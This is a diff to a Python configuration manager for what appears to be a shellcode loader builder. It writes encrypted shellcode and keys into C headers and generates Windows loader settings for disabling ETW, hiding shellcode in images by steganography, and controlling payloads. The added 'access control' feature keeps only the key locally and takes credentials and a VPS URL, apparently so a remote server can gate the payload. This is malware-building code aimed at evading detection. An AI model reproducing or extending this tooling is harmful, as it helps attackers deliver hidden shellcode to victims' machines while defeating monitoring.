@@ -143,6 +143,20 @@ class ConfigManager:
             f.write(",".join(f"0x{b:02x}" for b in encrypted_data))
             f.write("};\n")
             f.write(f"unsigned int shellcode_size = {len(encrypted_data)};\n")
+    def save_to_header_key_only(self):
+        """只保存密钥信息到shellcode.h 用于准入控制"""
+        output_path = os.path.join(self.output_dir, "shellcode.h")
+        with open(output_path, 'w') as f:
+            f.write("#pragma once\n\n")
+            
+            if self.key is None:
+                raise ValueError("Encryption key is not set")
+                
+            f.write("unsigned char key[] = {")
+            f.write(",".join(f"0x{b:02x}" for b in self.key))
+            f.write("};\n")
+            f.write(f"unsigned int key_size = {len(self.key)};\n\n")
+
     def save_to_header_placeholder(self, shellcode_size):
         output_path = os.path.join(self.output_dir, "shellcode.h")
         with open(output_path, 'w') as f:
@@ -156,6 +170,9 @@ class ConfigManager:
             f.write(f"unsigned char shellcode[{shellcode_size}];\n")
             f.write(f"unsigned int shellcode_size = {shellcode_size};\n")
     def update_config(self, settings):
+        if settings['enable_access_control'] and settings['enable_steg']:
+            raise ValueError("准入控制和图片隐写不能同时启用")
+            
         config_template = '''#pragma once
 #include <Windows.h>
 #include "Struct.h"
@@ -175,7 +192,15 @@ static BOOLEAN checkVXQQ = {check_VXQQ};
 static BOOLEAN EnableSteg = {enable_steg};
 static BOOLEAN DisableETW = {enable_disableETW};
 static BOOLEAN EnableMultiplePayloadControl = {enable_payloadControl};
+static BOOLEAN EnableAccessControl = {enable_access_control};
 static wchar_t const* stegPath = ENCRYPT_WSTR("\\\\{steg_path}");
+
+// 准入控制配置
+static std::string AppID = ENCRYPT_STR("{app_id}");
+static std::string AppSecret = ENCRYPT_STR("{app_secret}");
+static std::string VpsUrl = ENCRYPT_STR("{vps_url}");
+static std::string SheetID = ENCRYPT_STR("{sheet_id}");
+static std::string SpreadsheetToken = ENCRYPT_STR("{spreadsheet_token}");
 // ==================== CONFIG END ==========================
 '''
         config_content = config_template.format(
@@ -192,7 +217,13 @@ static wchar_t const* stegPath = ENCRYPT_WSTR("\\\\{steg_path}");
             enable_steg='TRUE' if settings['enable_steg'] else 'FALSE',
             enable_disableETW='TRUE' if settings['enable_disableETW'] else 'FALSE',
             enable_payloadControl='TRUE' if settings['enable_payloadControl'] else 'FALSE',
-            steg_path=settings['steg_path'] if settings['steg_path'] else ""
+            enable_access_control='TRUE' if settings['enable_access_control'] else 'FALSE',
+            steg_path=settings['steg_path'] if settings['steg_path'] else "",
+            app_id=settings['app_id'] if settings['app_id'] else "",
+            app_secret=settings['app_secret'] if settings['app_secret'] else "",
+            vps_url=settings['vps_url'] if settings['vps_url'] else "",
+            sheet_id=settings['sheet_id'] if settings['sheet_id'] else "",
+            spreadsheet_token=settings['spreadsheet_token'] if settings['spreadsheet_token'] else ""
         )
 
         with open(self.config_path, 'w') as f:
@@ -214,6 +245,12 @@ static wchar_t const* stegPath = ENCRYPT_WSTR("\\\\{steg_path}");
             'enable_steg': window.steg_check.isChecked(),
             'enable_disableETW': window.disable_etw_check.isChecked(),
             'enable_payloadControl': window.payloadControl_check.isChecked(),
+            'enable_access_control': window.access_control_check.isChecked(),
+            'app_id': window.app_id_edit.text() if hasattr(window, 'app_id_edit') else "",
+            'app_secret': window.app_secret_edit.text() if hasattr(window, 'app_secret_edit') else "",
+            'vps_url': window.vps_url_edit.text() if hasattr(window, 'vps_url_edit') else "",
+            'sheet_id': window.sheet_id_edit.text() if hasattr(window, 'sheet_id_edit') else "",
+            'spreadsheet_token': window.spreadsheet_token_edit.text() if hasattr(window, 'spreadsheet_token_edit') else "",
             'steg_path': window.steg_name.text()
         }
     def steg_shellcode_to_image(self, shellcode_data, output_path, input_image=None):
